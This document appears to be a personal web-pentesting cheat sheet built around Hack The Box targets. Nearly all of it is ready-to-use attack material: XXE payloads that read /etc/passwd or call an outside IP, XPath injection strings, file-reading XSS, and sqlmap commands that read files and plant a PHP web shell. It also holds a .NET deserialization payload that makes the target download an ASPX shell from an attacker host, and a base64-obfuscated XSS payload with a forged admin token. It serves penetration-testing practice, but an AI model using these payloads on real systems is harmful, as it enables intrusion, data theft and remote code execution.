# Web



### Dir-search

```
dirsearch -u URL -e php -x 403

ffuf -c -w SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u http://worker.htb/ -H “Host: FUZZ.worker.htb” -fs 185
```



### XXE

```
<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://10.10.16.109:8000/"> ]> 
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```



### XPath injection

```sh
' or '1'='1
' or ''='
x' or 1=1 or 'x'='y
/
//
//*
*/*
@*
count(/child::node())
x' or name()='username' or 'x'='y
' and count(/*)=1 and '1'='1
' and count(/@*)=1 and '1'='1
' and count(/comment())=1 and '1'='1
search=')] | //user/*[contains(*,'
search=Har') and contains(../password,'c
search=Har') and starts-with(../password,'c
```



### SSRF XSS

```html
<script>function naser(){x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();}</script>

<iframe id="myFrame" src="file:///../../index.php"></iframe>

<iframe src=”%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aalert(0)”>
  
<script>
x=new XMLHttpRequest;x.onload=function({document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>script>
```



### SQLMAP

```shell
sqlmap -r exp.txt -p productName --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=windows 

sqlmap -r req.txt -p productId --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=windows --file-read=C:\\inetpub\\wwwroot\\index.php

sqlmap -r req.txt -p productId --threads=10 --risk=3 --level=5 --eta --dbms=MySQL --os=windows --file-write=/root/Desktop/scripts/powny_shell.php --file-dest=C:\\inetpub\\wwwroot
```



### GraphQl

```bash
{__schema{types{name}}}
{ query: "{ __type(name: \"Cereal\") { name fields { name } } }" }
{Cereal(options: "{\"Cereal.id\" :1}")}
{query: "{plant(id:\"2\"){id,location}}"}
```



### DotNet JSON Deserialization + Download Helper

```bash
{"json":"{\"$type\": \"Cereal.DownloadHelper, Cereal\", \"URL\": \"http://10.10.16.125/cmdasp.aspx\", \"FilePath\": \"c:/inetpub/source/uploads/cmdasp.aspx\"}"}
```

### DotNet JSON Deserialisation + Xss

```bash
# Payload
var request = new XMLHttpRequest();
request.open('GET','https://cereal.htb/requests/11',true);
request.setRequestHeader('Authorization', 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiYWRtaW4iLCJleHAiOjE2NzE5MjU2NDZ9.Kdvz5tq2yOSkbZ8Z4XHNKEmteoFV_pTM48fPjDwWwuE');
request.setRequestHeader('X-Real-IP', '127.0.0.1');
request.send();

#Encode using Base64

{"json":"{\"title\":\"[XSS](javascript: eval.call`${atob`dmFyIHJlcXVlc3QgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKcmVxdWVzdC5vcGVuKCdHRVQnLCdodHRwczovL2NlcmVhbC5odGIvcmVxdWVzdHMvMTEnLHRydWUpOwpyZXF1ZXN0LnNldFJlcXVlc3RIZWFkZXIoJ0F1dGhvcml6YXRpb24nLCAnQmVhcmVyIGV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUp1WVcxbElqb2lZV1J0YVc0aUxDSmxlSEFpT2pFMk56RTVNalUyTkRaOS5LZHZ6NXRxMnlPU2tiWjhaNFhITktFbXRlb0ZWX3BUTTQ4ZlBqRHdXd3VFJyk7CnJlcXVlc3Quc2V0UmVxdWVzdEhlYWRlcignWC1SZWFsLUlQJywgJzEyNy4wLjAuMScpOwpyZXF1ZXN0LnNlbmQoKTs`}`)\",\"flavor\":\"bacon\",\"color\":\"#FFF\",\"description\":\"test\"}"}
```



### Subdomain

```
subjack -w ss.txt -t 100 -timeout 30 -o results.txt -ssl -v
python takeover.py -d domain.com -w wordlist.txt -t 20
```



### code auditing

```
./scripts/cobra.py -t <code_folder>
```

